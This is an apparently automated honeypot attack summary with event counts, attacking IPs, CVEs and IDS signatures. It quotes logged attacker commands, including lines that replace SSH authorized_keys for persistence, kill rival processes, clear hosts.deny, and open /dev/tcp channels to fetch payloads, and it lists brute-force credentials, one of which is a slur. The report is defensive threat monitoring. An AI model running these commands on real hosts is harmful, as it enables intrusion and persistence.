# Honeypot Attack Summary Report

**Report Generation Time:** 2025-10-16T11:01:32Z
**Timeframe:** 2025-10-16T10:20:01Z to 2025-10-16T11:00:01Z
**Files Used:**
- agg_log_20251016T102001Z.json
- agg_log_20251016T104001Z.json
- agg_log_20251016T110001Z.json

## Executive Summary

This report summarizes 29,974 events collected from the honeypot network. The majority of attacks targeted the Honeytrap, Suricata, and Cowrie honeypots. The most frequent attacks were VNC authentication failures, followed by the DoublePulsar backdoor installation attempts. The top attacking IP address was 77.83.240.70.

## Detailed Analysis

### Attacks by Honeypot
- Honeytrap: 9,102
- Suricata: 6,410
- Cowrie: 5,485
- Heralding: 3,451
- Sentrypeer: 2,112
- Redishoneypot: 1,718
- Ciscoasa: 1,303
- Dionaea: 119
- ssh-rsa: 84
- Mailoney: 38
- Tanner: 28
- Dicompot: 24
- Miniprint: 23
- ConPot: 22
- H0neytr4p: 17
- Honeyaml: 15
- ElasticPot: 14
- Adbhoney: 9

### Top Attacking IPs
- 77.83.240.70
- 45.134.26.47
- 10.17.0.5
- 124.236.108.141
- 193.22.146.182
- 103.184.238.221
- 10.140.0.3
- 23.94.26.58
- 172.86.95.115
- 185.243.5.158
- 172.86.95.98
- 154.221.27.234
- 40.83.182.122
- 94.247.135.5
- 173.249.41.171
- 166.140.87.173

### Top Targeted Ports/Protocols
- vnc/5900
- 5060
- 6379
- TCP/445
- 22
- TCP/5900
- 5903
- 8333
- 5901
- 23

### Most Common CVEs
- CVE-2002-0013 CVE-2002-0012
- CVE-2006-2369
- CVE-2019-11500 CVE-2019-11500
- CVE-1999-0183

### Commands Attempted by Attackers
- cd ~; chattr -ia .ssh; lockr -ia .ssh
- lockr -ia .ssh
- cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa ...">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~
- uname -a
- cat /proc/cpuinfo | grep name | wc -l
- cat /proc/cpuinfo | grep name | head -n 1 | awk '{print $4,$5,$6,$7,$8,$9;}'
- free -m | grep Mem | awk '{print $2 ,$3, $4, $5, $6, $7}'
- ls -lh $(which ls)
- which ls
- crontab -l
- w
- uname -m
- cat /proc/cpuinfo | grep model | grep name | wc -l
- top
- uname
- whoami
- lscpu | grep Model
- df -h | head -n 2 | awk 'FNR == 2 {print $2;}'
- rm -rf /tmp/secure.sh; rm -rf /tmp/auth.sh; pkill -9 secure.sh; pkill -9 auth.sh; echo > /etc/hosts.deny; pkill -9 sleep;
- Enter new UNIX password: 

### Signatures Triggered
- ET INFO VNC Authentication Failure
- ET EXPLOIT [PTsecurity] DoublePulsar Backdoor installation communication
- ET DROP Dshield Block Listed Source group 1
- ET DROP Spamhaus DROP Listed Traffic Inbound group 42
- ET SCAN NMAP -sS window 1024
- ET DROP Spamhaus DROP Listed Traffic Inbound group 41
- ET SCAN MS Terminal Server Traffic on Non-standard Port
- ET INFO Reserved Internal IP Traffic
- ET SCAN Sipsak SIP scan
- ET SCAN Potential SSH Scan

### Users / Login Attempts
- root/
- 345gs5662d34/345gs5662d34
- root/3245gs5662d34
- root/Qaz123qaz
- centos/123
- guest/1111111
- nobody/nobody2014
- root/0123456789
- guest/66666
- config/999
- root/1018632814
- root/25885200
- root/1029384756
- ftpuser/ftppassword
- guest/guest2004
- root/QWE123!@#qwe
- operator/operator222
- root/1978
- notify/notify123
- root/123@@@
- root/12345
- dat/dat
- m/123
- root/nigger
- root/Qwerty12
- root/1010101010
- root/lol123
- ubuntu/ubuntu@2020
- x/x
- root/bismillah

### Files Uploaded/Downloaded
- None

### HTTP User-Agents
- None

### SSH Clients and Servers
- **SSH Clients**: None
- **SSH Servers**: None

### Top Attacker AS Organizations
- None

## Key Observations and Anomalies

- A significant number of commands are related to reconnaissance and establishing persistence via SSH authorized_keys.
- The "DoublePulsar" signature indicates attempts to install a backdoor on compromised machines.
- The "VNC Authentication Failure" signature suggests widespread scanning for open VNC servers.
- A large number of `nohup bash -c "exec 6<>/dev/tcp/...` commands were observed, indicating attempts to download and execute payloads from remote servers.
